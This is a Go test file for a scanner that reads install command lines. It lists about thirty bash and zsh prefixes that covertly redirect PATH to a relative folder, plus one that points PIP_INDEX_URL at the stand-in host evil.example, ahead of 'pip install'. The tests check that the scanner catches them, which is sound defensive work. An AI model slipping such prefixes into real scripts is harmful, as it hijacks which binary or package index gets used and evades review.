package installread

import "testing"

// Re-review 15 of READER-EXPANSION-ENV-1 round 27 (reader-env 84515a8a): ways one line still assigns a variable in
// its own shell that both readers pass. Each line was run in a real shell (r15-proofs/shell/: bash 3.2.57 and zsh 5.9
// on the Mac, bash 5.2.15 in the pinned golang image) and leaves PATH set to the value shown; with PATH=1 or ./bin
// the line's pip is ./1/pip or ./bin/pip. The line's own "pip install zz-pkg" is silent without the prefix. Adopted
// in ADR-0159 round 28 as it was.
func TestReview15MissedAssigns(t *testing.T) {
	const u = "https://evil.example/simple"
	silent := func(line string) bool {
		tg, un, _, s := ParseLine(line)
		return len(un)+len(HookExtra(line, tg, un, s)) == 0
	}
	for _, tc := range []struct{ shells, prefix string }{
		// arithmetic the round does not find (bash 3.2, 5.2, zsh 5.9 unless named)
		{"bash zsh", ": $[PATH=1]"},                            // the old $[ ] arithmetic expansion
		{"bash zsh", "x=abc; : ${x: PATH=1}"},                  // a substring offset is arithmetic
		{"bash", "x=abc; : ${x:0:PATH=1}"},                     // and its length
		{"bash zsh", "[[ PATH=1 -eq 1 ]]"},                     // [[ -eq ]] operands are arithmetic
		{"bash zsh", "declare -i n=PATH=1"},                    // an integer variable's value is arithmetic
		{"bash zsh", "typeset -i n; n=PATH=1"},                 // and so is every later assignment to it
		{"bash zsh", "x='PATH=1'; (( x ))"},                    // a variable's value is evaluated as an expression
		{"bash zsh", "n=PATH; (( $n = 1 ))"},                   // a name by expansion
		{"bash zsh", "n=PATH; let $n=1"},                       // let with a name by expansion
		{"bash zsh", "echo $'\\'' >/dev/null; (( PATH = 1 ))"}, // lineArith reads $'\'' as an open quote
		{"zsh", "printf '%d' 'PATH=1' >/dev/null"},             // zsh's printf evaluates numeric arguments
		{"zsh", "repeat 'PATH=1' :"},                           // repeat's count is arithmetic
		{"zsh", "shift 'PATH=1'"},                              // shift's count is arithmetic
		{"zsh", ": ${(l:PATH=1:)x}"},                           // a padding flag's width is arithmetic
		// builtins that set a name the reader does not place
		{"bash zsh", "n=PATH; printf -v \"$n\" ./bin"}, // an indirect name: export "$n=./bin" holds, this does not
		{"bash zsh", "n=PATH; read \"$n\" <<< ./bin"},
		{"bash 5.2", "declare -n r; r=PATH; r=./bin"}, // a nameref without a target takes its first assignment as the name
		{"bash 5.2", "sleep 0 & wait -n -p PATH"},     // wait -p NAME (bash 5.1+): PATH becomes a pid, a relative folder
		{"zsh", "echo ./bin | read 'PATH?p'"},         // read NAME?prompt; zsh runs a pipeline's last command in the shell
		{"zsh", "print -rv PATH ./bin"},               // print -v in a cluster
		{"zsh", "zstyle :x y ./bin; zstyle -s :x y PATH"},
		{"zsh", "pushln ./bin; getln PATH"},
		{"zsh", "zformat -f PATH ./bin"},
		{"zsh", "foreach PATH (./bin) : ; end"}, // for NAME (…) is held; foreach is the same loop
		// zsh's path array appended to (PATH+=:./bin and path=($path ./bin) hold; the round's table names NAME+=)
		{"zsh", "path+=(./bin)"},
		{"zsh", "path+=./bin"},
		// zsh's expansion prefixes in front of the name
		{"zsh", ": ${~PATH::=./bin}"},
		{"zsh", ": ${=PATH::=./bin}"},
		{"zsh", ": ${^PATH::=./bin}"},
		{"zsh", "set -a; : ${~PIP_INDEX_URL:=" + u + "}"}, // env then shows PIP_INDEX_URL
	} {
		if line := tc.prefix + "; pip install zz-pkg"; silent(line) {
			t.Errorf("%s: %q: silent", tc.shells, line)
		}
	}
}

// The control: the line's install alone, and the honest forms near the new code, stay silent (they are at 45dba3a
// too: r15-proofs/honest-*.txt).
func TestReview15Controls(t *testing.T) {
	for _, line := range []string{
		"pip install zz-pkg",
		"make -j$((nproc+1)) && pip install zz-pkg",
		"if (( EUID != 0 )); then sudo npm i -g zz-pkg; fi",
		"read -r -p 'Continue? ' REPLY; pip install zz-pkg",
		"declare -i n=1; npm i zz-pkg",
		"[[ $x -eq 1 ]] && npm i zz-pkg",
	} {
		tg, un, _, s := ParseLine(line)
		if ex := HookExtra(line, tg, un, s); len(un)+len(ex) > 0 {
			t.Errorf("%q: held %q %q", line, un, ex)
		}
	}
}
